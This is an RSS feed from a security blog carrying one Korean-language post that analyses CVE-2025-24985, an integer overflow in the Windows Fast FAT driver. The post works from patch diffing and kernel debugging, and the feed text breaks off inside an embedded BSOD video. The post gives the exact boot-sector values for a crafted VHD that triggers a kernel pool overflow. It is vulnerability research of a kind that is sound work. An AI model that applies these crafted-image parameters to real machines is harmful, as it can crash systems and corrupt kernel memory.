<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>hackyboiz</title>
    <link>https://hackyboiz.github.io/</link>
    
    <atom:link href="https://hackyboiz.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>hack &amp; life</description>
    <pubDate>Thu, 17 Jul 2025 07:34:52 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>[Research] CVE-2025-24985: Windows Fast FAT Driver RCE Vulnerability (KR)</title>
      <link>https://hackyboiz.github.io/2025/07/17/ogu123/[Research]_CVE-2025-24985/KR/</link>
      <guid>https://hackyboiz.github.io/2025/07/17/ogu123/[Research]_CVE-2025-24985/KR/</guid>
      <pubDate>Thu, 17 Jul 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/2025/07/17/ogu123/[</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p><img src="/2025/07/17/ogu123/[Research]_CVE-2025-24985/KR/1.png" alt></p><blockquote><p>&#xBBF8;&#xC548;&#xD558;&#xB2E4; &#xC774;&#xAC70; &#xBCF4;&#xC5EC;&#xC8FC;&#xB824;&#xACE0; &#xC5B4;&#xADF8;&#xB85C;&#xB04C;&#xC5C8;&#xB2E4;.. ogu123 CVE-2025-24985 &#xBD84;&#xC11D; &#x3139;&#x3147; &#xC2E4;&#xD654;&#xB0D0;? [&#x2026;]</p></blockquote><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;! ogu123&#xC785;&#xB2C8;&#xB2E4;!</p><p>&#xADF8;&#xB3D9;&#xC548; &#xACF5;&#xAC1C;&#xB418;&#xC5B4; &#xC788;&#xB294; &#xC790;&#xB8CC;&#xB97C; &#xD1B5;&#xD574; 1-day &#xCDE8;&#xC57D;&#xC810; &#xACF5;&#xBD80;&#xD558;&#xBA70; &#xC81C;&#xAC00; &#xCCAB; &#xBC88;&#xC9F8;&#xB85C; &#xCDE8;&#xC57D;&#xC810; &#xBD84;&#xC11D;&#xAE00;&#xC744; &#xC791;&#xC131;&#xD558;&#xACE0; &#xC2F6;&#xB2E4;&#xB294; &#xC0DD;&#xAC01;&#xC774; &#xB4E4;&#xC5B4; &#xC774;&#xBC88; &#xC5F0;&#xAD6C;&#xAE00;&#xC744; &#xC900;&#xBE44;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;! <del>(&#xC55E;&#xC73C;&#xB85C;&#xB3C4; &#xD560;&#xC9C0;&#xB294; &#xBAA8;&#xB974;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#x314E;&#x314E;)</del></p><p>&#xBD84;&#xC11D; &#xACFC;&#xC815;&#xC744; &#xC790;&#xC138;&#xD788; &#xC791;&#xC131;&#xD558;&#xB824;&#xACE0; &#xD588;&#xACE0; BSOD PoC&#xB3C4; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC2E4;&#xC2B5;&#xD574; &#xBCF4;&#xC2DC;&#xB294; &#xAC83;&#xB3C4; &#xCD94;&#xCC9C;&#xB4DC;&#xB9BD;&#xB2C8;&#xB2E4;!</p><p>&#xADF8;&#xB7FC; &#xC2DC;&#xC791;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p><img src="/2025/07/17/ogu123/[Research]_CVE-2025-24985/KR/2.png" alt></p><ul><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-24985">https://nvd.nist.gov/vuln/detail/CVE-2025-24985</a></li></ul><p>&#xC77C;&#xB2E8; NVD&#xC5D0;&#xC11C; &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC0B4;&#xD3B4;&#xBCF4;&#xBA74; Windows Fast FAT &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD55C; Integer overflow&#xB85C; &#xC778;&#xD55C; RCE &#xCDE8;&#xC57D;&#xC810;&#xC774;&#xB77C;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC77C;&#xB2E8; Integer overflow&#xB77C;&#xB294; &#xD78C;&#xD2B8;&#xB97C; &#xC5BB;&#xC5C8;&#xACE0; &#xBCF8;&#xACA9;&#xC801;&#xC73C;&#xB85C; diffing&#xC744; &#xC2DC;&#xC791;&#xD574; &#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><h2 id="&#xBD84;&#xC11D;-&#xD658;&#xACBD;"><a href="#&#xBD84;&#xC11D;-&#xD658;&#xACBD;" class="headerlink" title="&#xBD84;&#xC11D; &#xD658;&#xACBD;"></a>&#xBD84;&#xC11D; &#xD658;&#xACBD;</h2><ul><li>Windows 10 version 22H2 19045.5854 for x64-based Systems education<ul><li>&#xCDE8;&#xC57D;&#xC810; &#xD328;&#xCE58; &#xC774;&#xC804; &#xBC84;&#xC804;: fastfat.sys 10.0.19041.5438 (KB5051974)</li><li>&#xCDE8;&#xC57D;&#xC810; &#xD328;&#xCE58; &#xC774;&#xD6C4; &#xBC84;&#xC804;: fastfat.sys 10.0.19041.5607 (KB5053606)</li></ul></li></ul><h2 id="&#xD328;&#xCE58;-&#xBD84;&#xC11D;"><a href="#&#xD328;&#xCE58;-&#xBD84;&#xC11D;" class="headerlink" title="&#xD328;&#xCE58; &#xBD84;&#xC11D;"></a>&#xD328;&#xCE58; &#xBD84;&#xC11D;</h2><p><img src="/2025/07/17/ogu123/[Research]_CVE-2025-24985/KR/3.png" alt></p><p>bindiff &#xACB0;&#xACFC;&#xB97C; &#xC0B4;&#xD3B4;&#xBCF4;&#xBA74; &#xD328;&#xCE58; &#xD6C4; <code>FatSetupAllocationSupport()</code>, <code>FatExamineFatEntries()</code> &#xD568;&#xC218;&#xAC00; &#xBCC0;&#xACBD;&#xB418;&#xC5C8;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <del>(&#xB450; &#xAC1C;&#xBC16;&#xC5D0; &#xBCC0;&#xACBD;&#xC774; &#xC548;&#xB418;&#xC5C8;&#xB124;&#xC694; &#xD734;~)</del></p><p>&#xADF8;&#xB7FC; &#xD328;&#xCE58; &#xC804;/&#xD6C4; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xBE44;&#xAD50;&#xD574; &#xAC01; &#xD568;&#xC218;&#xC5D0; &#xC5B4;&#xB5A4; &#xCF54;&#xB4DC; &#xBCC0;&#xACBD;&#xC810;&#xC774; &#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD574; &#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><h3 id="FatSetupAllocationSupport"><a href="#FatSetupAllocationSupport" class="headerlink" title="FatSetupAllocationSupport()"></a>FatSetupAllocationSupport()</h3><p><img src="/2025/07/17/ogu123/[Research]_CVE-2025-24985/KR/4.png" alt></p><p>&#xC704;&#xB294; &#xD328;&#xCE58;&#xAC00; &#xC801;&#xC6A9;&#xB41C; <code>FatSetupAllocationSupport()</code> &#xD568;&#xC218;&#xB85C; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xBCC0;&#xACBD;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>&#xBE68;&#xAC04;&#xC0C9; else &#xBB38;&#xC5D0;&#xC11C; &#xC5F0;&#xC0B0;&#xC744; &#xC218;&#xD589;&#xD558;&#xAE30; &#xC804; overflow&#xB97C; &#xAC80;&#xC99D;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xAC00; &#xCD94;&#xAC00;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul><h3 id="FatExamineFatEntries"><a href="#FatExamineFatEntries" class="headerlink" title="FatExamineFatEntries()"></a>FatExamineFatEntries()</h3><p><img src="/2025/07/17/ogu123/[Research]_CVE-2025-24985/KR/5.png" alt></p><p>&#xC704;&#xB294; &#xD328;&#xCE58;&#xAC00; &#xC801;&#xC6A9;&#xB41C; <code>FatExamineFatEntries()</code> &#xD568;&#xC218;&#xB85C; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xBCC0;&#xACBD;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>if &#xBB38;&#xC774; true&#xC77C; &#xACBD;&#xC6B0;, *(a2 + 0x15C) &#xAC12;&#xC744; v47 &#xBCC0;&#xC218; &#xAC12;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; v47 &#xBCC0;&#xC218; &#xAC12;&#xC5D0;<br>overflow&#xB97C; &#xAC80;&#xC99D;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xAC00; &#xCD94;&#xAC00;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>&#xC774;&#xD6C4; V47 + 7 &#xAC12;&#xC5D0;&#xC11C; overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xC9C0; &#xC54A;&#xB294;&#xB2E4;&#xBA74; <code>ExAllocatePoolWithTag()</code> &#xD568;&#xC218; Size<br>&#xAC12;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</li></ul><p>&#xD568;&#xC218; &#xD638;&#xCD9C; &#xACFC;&#xC815;&#xC740; <code>FatSetupAllocationSupport()</code> &#x2192;  <code>FatExamineFatEntries()</code>&#xC774;&#xBBC0;&#xB85C; &#xD328;&#xCE58; &#xC804; &#xBC14;&#xC774;&#xB108;&#xB9AC; <code>FatSetupAllocationSupport()</code> &#xD568;&#xC218;&#xBD80;&#xD130; Top-down&#xC73C;&#xB85C; &#xBD84;&#xC11D;&#xD558;&#xB418; &#xAC01; &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xC544;&#xB798; &#xB0B4;&#xC6A9;&#xC744; &#xC704;&#xC8FC;&#xB85C; &#xC0B4;&#xD3B4;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><ul><li><code>FatSetupAllocationSupport()</code><ul><li>&#xC5F0;&#xC0B0;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xAC12;</li></ul></li><li><code>FatExamineFatEntries()</code><ul><li>if &#xBB38;&#xC758; &#xC870;&#xAC74;</li><li>*(a2 + 0x15C) &#xAC12;</li></ul></li></ul><h2 id="&#xCDE8;&#xC57D;&#xC810;-&#xBD84;&#xC11D;"><a href="#&#xCDE8;&#xC57D;&#xC810;-&#xBD84;&#xC11D;" class="headerlink" title="&#xCDE8;&#xC57D;&#xC810; &#xBD84;&#xC11D;"></a>&#xCDE8;&#xC57D;&#xC810; &#xBD84;&#xC11D;</h2><p><img src="/2025/07/17/ogu123/[Research]_CVE-2025-24985/KR/6.png" alt></p><p>&#xBA3C;&#xC800; <code>FatSetupAllocationSupport()</code> &#xD568;&#xC218;&#xB97C; &#xBD84;&#xC11D;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xC784;&#xC758;&#xC758; vhd &#xD30C;&#xC77C;&#xC744; &#xC0DD;&#xC131;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;!</p><ul><li>&#xD30C;&#xC77C;&#xBA85;: ogu123.vhd</li><li>&#xB514;&#xC2A4;&#xD06C; &#xD06C;&#xAE30;: 1GB</li><li>&#xB514;&#xC2A4;&#xD06C; &#xD3EC;&#xB9F7;: VHD</li><li>&#xB514;&#xC2A4;&#xD06C; &#xC720;&#xD615;: &#xACE0;&#xC815; &#xD06C;&#xAE30;</li><li>&#xD30C;&#xD2F0;&#xC158; &#xD615;&#xC2DD;: MBR</li><li>&#xD30C;&#xD2F0;&#xC158; &#xC2DC;&#xC2A4;&#xD15C;: FAT32</li></ul><p>&#xBD84;&#xC11D; &#xC804;, Kernel &#xB514;&#xBC84;&#xAE45; &#xC138;&#xD305; &#xACFC;&#xC815;&#xC740; &#xC544;&#xB798; &#xC5F0;&#xAD6C;&#xAE00;&#xC744; &#xCC38;&#xACE0;&#xD558;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;!(&#xC0E4;&#xB77C;&#xC6C3; L0ch)</p><ul><li><a href="https://hackyboiz.github.io/2021/05/30/l0ch/windows-driver/">https://hackyboiz.github.io/2021/05/30/l0ch/windows-driver/</a></li></ul><p><img src="/2025/07/17/ogu123/[Research]_CVE-2025-24985/KR/7.png" alt></p><p>Kernel &#xB514;&#xBC84;&#xAE45; &#xC138;&#xD305; &#xD6C4; <code>FatSetupAllocationSupport()</code> &#xD568;&#xC218;&#xC5D0; break point&#xB97C; &#xAC78;&#xACE0; &#xC55E;&#xC11C; &#xC0DD;&#xC131;&#xD55C; ogu123.vhd &#xD30C;&#xC77C;&#xC744; &#xB9C8;&#xC6B4;&#xD2B8; &#xC2DC;&#xD0A4;&#xBA74; &#xBD84;&#xC11D;&#xC744; &#xC2DC;&#xC791;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p>&#xBD84;&#xC11D; &#xACB0;&#xACFC; else &#xBB38;&#xB0B4;&#xC5D0; &#xAC12;&#xC744; &#xC704;&#xC640; &#xAC19;&#xC774; &#xD655;&#xC778;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC55E;&#xC11C; &#xD328;&#xCE58;&#xB41C; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC5D0;&#xC11C;&#xB294; &#xC5F0;&#xC0B0;&#xD558;&#xAE30; &#xC804; overflow&#xB97C; &#xAC80;&#xC99D;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xAC00; &#xCD94;&#xAC00;&#xB418;&#xC5C8;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC720;&#xC800;&#xAC00; &#xCEE8;&#xD2B8;&#xB864;&#xD560; &#xC218; &#xC788;&#xB294; &#xAC12;&#xC774;&#xB77C;&#xB294; &#xC0DD;&#xAC01;&#xC73C;&#xB85C; vhd &#xD30C;&#xC77C;&#xC744; &#xD655;&#xC778;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/07/17/ogu123/[Research]_CVE-2025-24985/KR/8.png" alt></p><p>vhd &#xD30C;&#xC77C; &#xD655;&#xC778;&#xD55C; &#xACB0;&#xACFC; drive - boot_sector &#xB0B4;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xAC12;&#xC744; else &#xBB38;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;..!</p><p>&#xC5EC;&#xAE30;&#xC11C; tip&#xC740; 010 editor Templates&#xC5D0;&#xC11C; VHD&#xAC00; &#xC544;&#xB2CC; Drive&#xB85C; &#xC124;&#xC815;&#xD558;&#xC154;&#xC57C; &#xC704; &#xADF8;&#xB9BC;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/07/17/ogu123/[Research]_CVE-2025-24985/KR/9.png" alt></p><p>vhd &#xD30C;&#xC77C;&#xC5D0; &#xC788;&#xB294; &#xAC12;&#xC744; &#xBCC0;&#xC218;&#xC5D0; &#xB9E4;&#xCE6D; &#xC2DC;&#xCF1C; &#xD655;&#xC778;&#xD574; &#xC704; &#xADF8;&#xB9BC;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. <del>(&#xC54C;&#xB85D;&#xB2EC;&#xB85D;&#xD558;&#xB124;&#xC694; &#x314E;&#x314E;)</del></p><ul><li>V15 = (NumberOfSector32 - NumberOfFatTables * SectorsPerFat32 - ReservedSectors) /<br>SectorsPerCluster</li></ul><p>&#xC5F0;&#xC0B0;&#xC744; &#xBCF4;&#xBA74; FAT &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C; &#xD074;&#xB7EC;&#xC2A4;&#xD130; &#xC218;&#xB97C; &#xACC4;&#xC0B0;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC774;&#xB77C;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p>&#xC9C0;&#xAE08;&#xAE4C;&#xC9C0; &#xB0B4;&#xC6A9;&#xC744; &#xC815;&#xB9AC;&#xD558;&#xBA74; &#xD328;&#xCE58; &#xD6C4; <code>FatSetupAllocationSupport()</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xD074;&#xB7EC;&#xC2A4;&#xD130; &#xC218; &#xC5F0;&#xC0B0;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xAC12;&#xC5D0; overflow&#xB97C; &#xAC80;&#xC99D;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xAC00; &#xCD94;&#xAC00;&#xB418;&#xC5C8;&#xACE0;, &#xADF8;&#xB9BC;&#xC5D0;&#xB294; &#xC5C6;&#xC9C0;&#xB9CC; &#xD074;&#xB7EC;&#xC2A4;&#xD130; &#xC218;&#xB97C; *(a2 + 0x15C)&#xC5D0; &#xC800;&#xC7A5;&#xD55C;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xD6C4; <code>FatExamineFatEntries()</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; <code>ExAllocatePoolWithTag()</code> &#xD568;&#xC218; size &#xAC12;&#xC73C;&#xB85C; &#xD074;&#xB7EC;&#xC2A4;&#xD130; &#xC218;(<em>(a2 + 0x15C))&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; &#xBA3C;&#xC800; if (</em>(a2 + 0xC8) &lt;= 1u) &#xBB38;&#xC5D0;&#xC11C; true&#xAC00; &#xB418;&#xC5B4;&#xC57C; &#xD558;&#xBBC0;&#xB85C; *(a2 + 0xC8) &#xAC12;&#xC744; &#xCD94;&#xC801;&#xD574; &#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p><img src="/2025/07/17/ogu123/[Research]_CVE-2025-24985/KR/10.png" alt></p><p>&#xBD84;&#xC11D; &#xACB0;&#xACFC; <code>FatExamineFatEntries()</code> &#xD568;&#xC218; &#xB0B4;&#xC5D0; &#xC788;&#xB294; if (*(a2 + 0xC8) &lt;= 1u)&#xC744; <code>FatSetupAllocationSupport()</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xBA3C;&#xC800; &#xD655;&#xC778;&#xD55C;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xC54C;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>if (<em>(a2 + 0xC8) &lt;= 1u) &#xBB38;&#xC774; true&#xAC00; &#xB418;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; if(</em>(a2 + 0x168) &#x2026; v34 &gt;<br>0x10000) &#xBB38;&#xC5D0;&#xC11C; v35 &#xBCC0;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xAC70;&#xB098; else &#xBB38;&#xC5D0; &#xB4E4;&#xC5B4;&#xAC00;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB54C;, &#xD074;&#xB7EC;&#xC2A4;&#xD130; &#xC5F0;&#xC0B0; &#xACFC;&#xC815;&#xC5D0; &#xB4E4;&#xC5B4;&#xAC00;&#xAE30; &#xC704;&#xD574;&#xC11C; <em>(a2 + 0x168) &#xAC12;&#xC774; 0x20&#xC774;&#xC5EC;&#xC57C;&#xB9CC;<br>&#xD558;&#xACE0;, v34 &#xBCC0;&#xC218;&#xB294; &#xD074;&#xB7EC;&#xC2A4;&#xD130; &#xC218;(</em>(a2 + 0x15c))&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; *(a2 + 0xC8) &#xAC12;&#xC744; v35 &#xBCC0;&#xC218;&#xB85C; &#xCEE8;&#xD2B8;&#xB864;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><strong>&#xD074;&#xB7EC;&#xC2A4;&#xD130; &#xC218;&#xB97C; 0xFFFFFFFB &#xAC12;</strong>&#xC73C;&#xB85C; &#xC218;&#xC815;&#xD558;&#xBA74; &#xC544;&#xB798; &#xACFC;&#xC815;&#xC744; &#xAC70;&#xCCD0; if (*(a2 + 0xC8) &lt;= 1u) &#xBB38;&#xC5D0;&#xC11C; true&#xAC00; &#xB418;&#xB3C4;&#xB85D; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>v35 = (0xFFFFFFFB + 0xFFFF) = 0xFFFA</li><li>(*(a2 + 0xC8) = 0xFFFA &gt;&gt; 0x10 = 0</li></ul><p><img src="/2025/07/17/ogu123/[Research]_CVE-2025-24985/KR/11.png" alt></p><p>vhd &#xD30C;&#xC77C;&#xC744; &#xC704;&#xC640; &#xAC19;&#xC774; &#xC218;&#xC815;&#xD558;&#xBA74;, &#xC544;&#xB798; &#xC5F0;&#xC0B0;&#xC744; &#xAC70;&#xCCD0; <strong>&#xD074;&#xB7EC;&#xC2A4;&#xD130; &#xC218;&#xAC00; 0xFFFFFFFB &#xAC12;</strong>&#xC744; &#xAC00;&#xC9C0;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><ul><li>V15 = (NumberOfSector32 - NumberOfFatTables * SectorsPerFat32 - ReservedSectors) /<br>SectorsPerCluster</li><li><strong>0xFFFFFFFB</strong> = ( 0xFFFFFFFF - 0x2 * 0x80000000 - 0x4 ) / 0x1</li></ul><p><img src="/2025/07/17/ogu123/[Research]_CVE-2025-24985/KR/12.png" alt></p><p>&#xC218;&#xC815;&#xB41C; vhd &#xD30C;&#xC77C;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xBA74; if(<em>(a2 + 0x168) &#x2026; v34 &gt; 0x10000) &#xB0B4;&#xC5D0;&#xC11C; overflow&#xB85C; &#xC778;&#xD574; </em>(a2 + 0xC8) &#xAC12;&#xC774; 0 &#xC774;&#xB418;&#xC5B4; if &#xBB38;&#xC774; true&#xB85C;, &#xD074;&#xB7EC;&#xC2A4;&#xD130; &#xC218;(0xfffffffb)&#xB97C; NumberOfClusters &#xBCC0;&#xC218; &#xAC12;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/07/17/ogu123/[Research]_CVE-2025-24985/KR/13.png" alt></p><p>&#xC774;&#xD6C4; <code>ExAllocatePoolWithTag()</code> &#xD568;&#xC218; Size &#xAC12;&#xC744; &#xC5F0;&#xC0B0;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC73C;&#xB85C; (NumberOfClusters +<br>7) &#xC5F0;&#xC0B0; &#xC2DC; overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD574; rdx &#xAC12;&#xC774; 0x2&#xAC00; &#xB418;&#xACE0; &gt;&gt; 3 &#xC5F0;&#xC0B0; &#xC2DC; &#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; Size &#xAC12;&#xC740; 0x0&#xC774; &#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/07/17/ogu123/[Research]_CVE-2025-24985/KR/14.png" alt></p><p><code>ExAllocatePoolWithTag()</code> &#xD568;&#xC218; &#xC2E4;&#xD589; &#xD6C4; &#xBA54;&#xBAA8;&#xB9AC; pool &#xD398;&#xC774;&#xC9C0;&#xC758; &#xBE14;&#xB85D; &#xC815;&#xBCF4;&#xB97C; &#xD655;&#xC778;&#xD55C; &#xBAA8;&#xC2B5;&#xC785;&#xB2C8;&#xB2E4;.<br><code>ExAllocatePoolWithTag()</code> &#xD568;&#xC218;&#xC758; Size &#xAC12;&#xC774; 0x0 &#xC774;&#xC5EC;&#xB3C4; 0x20&#xB9CC;&#xD07C;&#xC758; Size&#xAC00; paged pool&#xC5D0; &#xD560;&#xB2F9;&#xB418;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/07/17/ogu123/[Research]_CVE-2025-24985/KR/15.png" alt></p><p>&#xC774;&#xD6C4; &#xD560;&#xB2F9;&#xD55C; &#xC601;&#xC5ED;&#xC740; <code>RtlInitializeBitMap()</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xBE44;&#xD2B8;&#xB9F5;&#xC73C;&#xB85C; &#xCD08;&#xAE30;&#xD654;&#xB429;&#xB2C8;&#xB2E4;.</p><p><code>ExAllocatePoolWithTag()</code> &#xC640; <code>RtlInitializeBitMap()</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xD074;&#xB7EC;&#xC2A4;&#xD130; 1&#xAC1C;&#xB2F9; 1&#xBE44;&#xD2B8;&#xC529; &#xB9E4;&#xD551;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC784;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>){   [...]       <span class="hljs-keyword">if</span> ( !v29 &amp;&amp; v32 )                          <span class="hljs-comment">// free -&gt; used </span>    {       v38 = v7 - v30;       <span class="hljs-keyword">if</span> ( v14 )       {         *v14 += v38;         v10[<span class="hljs-number">2</span>] += v38;         v17 = v45;       }       <span class="hljs-keyword">if</span> ( p_BitMapHeader )       {         RtlClearBits(p_BitMapHeader, v30 - v69, v38);         v17 = v45;         v32 = v68;         v28 = <span class="hljs-number">0</span>;       }       v29 = <span class="hljs-number">1</span>;       v48 = <span class="hljs-number">1</span>;       v30 = v7;       v51 = v7;     }     <span class="hljs-keyword">if</span> ( v29 == <span class="hljs-number">1</span> &amp;&amp; !v32 )                     <span class="hljs-comment">// used -&gt; free </span>    {       <span class="hljs-keyword">if</span> ( p_BitMapHeader )       {         RtlSetBits(p_BitMapHeader, v30 - v69, v7 - v30);         v17 = v45;         v28 = <span class="hljs-number">0</span>;       }       v29 = v28;       v48 = v28;       v30 = v7;       v51 = v7;     }   [...]   }</code></pre><p>&#xBE44;&#xD2B8;&#xB9F5; &#xCD08;&#xAE30;&#xD654; &#xC774;&#xD6C4; &#xC704; while &#xBB38;&#xC5D0;&#xC11C; vhd &#xD30C;&#xC77C; &#xB0B4;&#xC5D0; &#xD074;&#xB7EC;&#xC2A4;&#xD130;&#xC758; &#xC0C1;&#xD0DC; &#xBCC0;&#xD654;(free -&gt; used, used -&gt; free)&#xB97C; &#xD0D0;&#xC9C0;&#xD558;&#xC5EC; &#xBE44;&#xD2B8;&#xB9F5;&#xC5D0; &#xAE30;&#xB85D;&#xD569;&#xB2C8;&#xB2E4;. </p><p><code>RtlClearBits()</code>&#xC640; <code>RtlSetBits()</code> &#xD568;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xBE44;&#xD2B8;&#xB9F5;&#xC744; &#xC218;&#xC815;&#xD558;&#xBA70;, &#xC774;&#xB97C; &#xD1B5;&#xD574; &#xD074;&#xB7EC;&#xC2A4;&#xD130; &#xD560;&#xB2F9; &#xC0C1;&#xD0DC;&#xB97C; &#xAD00;&#xB9AC;&#xD55C;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB54C; while &#xBB38;&#xC740; &#xD074;&#xB7EC;&#xC2A4;&#xD130; &#xC218;(0xfffffffb) &#xB9CC;&#xD07C; &#xC2E4;&#xD589;&#xB418;&#xBA74;&#xC11C; &#xBE44;&#xD2B8;&#xB9F5; &#xB370;&#xC774;&#xD130;&#xB97C; write &#xD558;&#xB294;&#xB370;, <code>ExAllocatePoolWithTag()</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xD560;&#xB2F9;&#xB41C; &#xBE44;&#xD2B8;&#xB9F5; &#xD06C;&#xAE30;&#xAC00; 0x20&#xC774;&#xBBC0;&#xB85C; &#xD560;&#xB2F9;&#xB41C; pool &#xC601;&#xC5ED;&#xC744; &#xB118;&#xC5B4; Kernel pool overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><h2 id="BSOD-&#xD2B8;&#xB9AC;&#xAC70;"><a href="#BSOD-&#xD2B8;&#xB9AC;&#xAC70;" class="headerlink" title="BSOD &#xD2B8;&#xB9AC;&#xAC70;"></a>BSOD &#xD2B8;&#xB9AC;&#xAC70;</h2><iframe width="560" height="315" src="https://www.youtube.com/embed/6ppD0oRZhXU?si=NEvYSd5jf0NMaObw" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" 